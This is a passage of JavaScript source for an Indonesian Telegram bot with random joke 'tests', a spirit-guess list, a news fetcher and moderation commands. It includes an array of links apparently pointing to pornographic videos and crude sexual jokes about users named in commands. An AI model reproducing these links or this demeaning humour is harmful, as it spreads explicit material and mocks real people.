  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekjanda$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
    
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote><b>👠 HASIL TES KEJANDAAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📊 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarJanda(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekpacar$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
   
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote><b>💕 HASIL TES KEPACARAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📊 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarPacar(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/ceksabar$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote><b>💕 HASIL TES KESABARAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📊 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarSabar(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cektolol$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote><b>💕 HASIL TES KETOLOLAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📊 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarTolol(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekmati$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
  const nilai = Math.floor(Math.random() * 101);
  const teks = `<blockquote><b>💕 HASIL TES KETOLOLAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📊 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarMati(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});
function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}

function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

function komentarSabar(nilai) {
  if (nilai >= 100) return "🌟 Wah, kamu luar biasa sabar dan hebat!";
  if (nilai >= 94) return "👍 Tetap sabar, kesuksesan sudah dekat.";
  if (nilai >= 90) return "😊 Sabar itu kunci, terus semangat ya!";
  if (nilai >= 83) return "💪 Kamu kuat, sabar sedikit lagi.";
  if (nilai >= 78) return "🌱 Sabar tumbuh jadi kekuatan.";
  if (nilai >= 73) return "✨ Jangan lelah bersabar, hasilnya manis.";
  if (nilai >= 68) return "🧘‍♂️ Tenang, sabar membawa kedamaian.";
  if (nilai >= 54) return "🌸 Sabar itu indah, teruslah berusaha.";
  if (nilai >= 50) return "🌈 Percaya deh, sabar ada hadiahnya.";
  if (nilai >= 45) return "☀️ Sabar sedikit lagi, kamu pasti bisa.";
  if (nilai >= 35) return "🌻 Jangan putus asa, sabar selalu membantu.";
  if (nilai >= 30) return "🕊️ Sabar itu pelajaran berharga.";
  if (nilai >= 20) return "🌿 Terus sabar ya, jangan menyerah.";
  if (nilai >= 10) return "🤲 Sedikit sabar, banyak berkah.";
  return "🙏 Sabar ya, setiap ujian ada hikmahnya.";
}

function komentarTolol(nilai) {
  if (nilai >= 100) return "🤪 Wah, level tololmu sudah master, salut!";
  if (nilai >= 94) return "😂 Udah pinter, tapi masih suka kocak.";
  if (nilai >= 90) return "😜 Kreatif banget, tolol yang menghibur!";
  if (nilai >= 83) return "😅 Santai aja, semua orang kadang tolol.";
  if (nilai >= 78) return "😆 Lumayan kocak, jangan berubah ya.";
  if (nilai >= 73) return "😉 Tolol tapi charming, kombinasi keren.";
  if (nilai >= 68) return "😎 Asal jangan kebanyakan mikir, santuy.";
  if (nilai >= 54) return "🤭 Jangan sedih, tolol itu manusiawi.";
  if (nilai >= 50) return "🙂 Santuy, semua ada waktunya.";
  if (nilai >= 45) return "😬 Masih wajar kok, jangan dipikirin.";
  if (nilai >= 35) return "🤔 Kadang tolol itu bikin lucu, ya kan?";
  if (nilai >= 30) return "😴 Santai, jangan terlalu serius.";
  if (nilai >= 20) return "😐 Bisa jadi tolol pintar, coba terus.";
  if (nilai >= 10) return "🙃 Hidup terlalu singkat buat terlalu serius.";
  return "😵 Wah, kamu jago banget jadi tolol, jangan berubah!";
}

function komentarMati(nilai) {
  if (nilai >= 100) return "💀 1 tahun lagi, kamu bakal jadi legenda!";
  if (nilai >= 94) return "☠️ 5 tahun lagi, siap-siap jadi juara!";
  if (nilai >= 90) return "🪦 10 tahun lagi, perjalanan masih panjang.";
  if (nilai >= 83) return "😵 15 tahun lagi, jangan berhenti berusaha.";
  if (nilai >= 78) return "🦴 20 tahun lagi, kesabaranmu diuji.";
  if (nilai >= 73) return "⚰️ 25 tahun lagi, semangat terus ya!";
  if (nilai >= 68) return "🕯️ 30 tahun lagi, jangan patah semangat.";
  if (nilai >= 54) return "🪦 40 tahun lagi, masih banyak waktu buat berkarya.";
  if (nilai >= 50) return "💤 50 tahun lagi, tetap jaga kesehatan dan mimpi.";
  if (nilai >= 45) return "🛌 60 tahun lagi, santai tapi jangan malas.";
  if (nilai >= 35) return "🌫️ 70 tahun lagi, teruslah berjuang.";
  if (nilai >= 30) return "😶‍🌫️ 80 tahun lagi, perjalanan panjang menanti.";
  if (nilai >= 20) return "🌙 90 tahun lagi, semangat terus hidupnya!";
  if (nilai >= 10) return "🌑 100 tahun lagi, kamu bakal jadi legenda abadi.";
  return "🌌 Lebih dari 100 tahun lagi, perjalananmu baru mulai.";
}
async function loadCekKhodam() {
  try {
    const url = "https://raw.githubusercontent.com/angkasanotdev/DatabaseRaw/refs/heads/main/cekkhodam.json";
    const res = await axios.get(url);
    cekKhodam = res.data;
    console.log("✅ Berhasil load List Cek Khodam:", cekKhodam.length, "item");
  } catch (err) {
    console.error("❌ Gagal load List Cek Khodam:", err.message);
  }
}
bot.onText(/^\/cekkodam(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const nama = (match[1] || '').trim();

  try {
    if (!nama) {
      return bot.sendMessage(chatId, `<blockquote>🤓 Namanya mana anjeng? ketik /cekkhodam nama</blockquote>`, { 
      parse_mode: 'HTML' 
      });
    }

    if (!cekKhodam.length) {
      return bot.sendMessage(chatId, `⚠️ List khodam kosong / gagal dimuat dari Database.`, {
      parse_mode: "HTML"
      });
    }

    const hasil = `<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:</b>
╭───────────────────────
├ • ɴᴀᴍᴀ : ${nama}
├ • ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(cekKhodam)}
├ • ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰────────────────────────
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>`;

    bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
  } catch (error) {
    console.error("❌ Error cek khodam:", error);
    bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat cek khodam. Coba lagi nanti.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});
bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");
  
  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©PdlPdf News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});
bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/muslimai(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "🤖 Mau nanya apa ke MuslimAi?\nContoh: `/muslimai Apa arti hidup?`", {
      parse_mode: "Markdown"
    });
  }

  await bot.sendMessage(chatId, "⏳ Sedang mencari jawaban dari MuslimAi...");

  try {
    const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`);

    const hasil = `
*[ Muslim Ai ]*
📌 Pertanyaan: ${text}

💡 Jawaban: ${response.data.data}
`;

    bot.sendMessage(chatId, hasil, { parse_mode: "Markdown" });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses pertanyaan MuslimAi.");
  }
});
 
// Daftar khodam
const khodam = [
  "Kulkas 2 pintu", "Kumis lele", "Kumis Lele", "Lemari dua Pintu", "Kacang Hijau",
  "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware",
  "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan",
  "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen",
  "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker",
  "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis",
  "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan",
  "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang",
  "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem",
  "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Terbang",
  "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter",
  "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok",
  "Es Kopyor", "Es Jeruk", "(@bellachu/baileys);", "chalk", "gradient-string",
  "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now",
  "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon",
  "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone",
  "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit",
  "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu",
  "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", "Kotak Amal",
  "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat",
  "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"
];

// Fungsi pilih khodam random
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())];
}

// Command: /cekkhodam <nama>
bot.onText(/^\/cekkhodam(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Masukkan nama siapa yang mau di cek khodam-nya.\n\nContoh: `/cekkhodam Jamal`", {
      parse_mode: "Markdown"
    });
  }

  const kdm = pickRandom(khodam);
  const kodamn = `*Khodam ${text} adalah:* ${kdm}`;

  bot.sendMessage(chatId, kodamn, { parse_mode: "Markdown" });
});

const paptt = [
  "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
  "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
  "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
  "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
  "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
  "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
  "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
  "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
  "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
  "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
  "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
  "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
  "https://telegra.ph/file/267744a1a8c897b1636b9.jpg"
];

// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command: /pap
bot.onText(/^\/paptt$/, (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  const url = pickRandom(paptt);

  // Tentukan tipe file berdasarkan ekstensi
  if (url.endsWith(".mp4")) {
    bot.sendVideo(chatId, url, { caption: "Nohh 🎥" });
  } else if (url.endsWith(".jpg")) {
    bot.sendPhoto(chatId, url, { caption: "Nohh 📷" });
  } else {
    bot.sendMessage(chatId, "Nohh", { reply_to_message_id: msg.message_id });
  }
});

const bokep = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4" 
  ];
  
// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command /cekkontol
bot.onText(/^\/cekkontol(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const q = match[1];

  if (!q) {
    return bot.sendMessage(chatId, `Ketik nama yang mau di cek.\nContoh:\n/cekkontol Rizky`);
  }

  const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
  ];

  const kodam = khodam[Math.floor(Math.random() * khodam.length)];

  const respons = `
°「 *CEK KONTOL* 」°

• *Nama:* ${q}
• *Kontol:* ${kodam}
`;

  bot.sendMessage(chatId, respons, { parse_mode: "Markdown" });
});

// Command /cekganteng
bot.onText(/^\/cekganteng(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const name = match[1];

  if (!name) {
    return bot.sendMessage(chatId, "⚠️ NAMA LU MANA??\nContoh:\n/cekganteng Rizky");
  }

  const ganteng = [
    "cuman 10% doang",
    "20% kurang ganteng soal nya",
    "0% karna nggak ganteng",
    "30% mayan gantengg",
    "40% ganteng",
    "50% Otw cari janda😎",
    "60% Orang Ganteng",
    "70% Ganteng bet",
    "80% gantengggg parah",
    "90% Ganteng idaman ciwi ciwi",
    "100% Ganteng Bgt bjirr"
  ];

  const hasil = ganteng[Math.floor(Math.random() * ganteng.length)];
  const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${name}* ${hasil}`;

  bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

// ====== kata kata =====
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
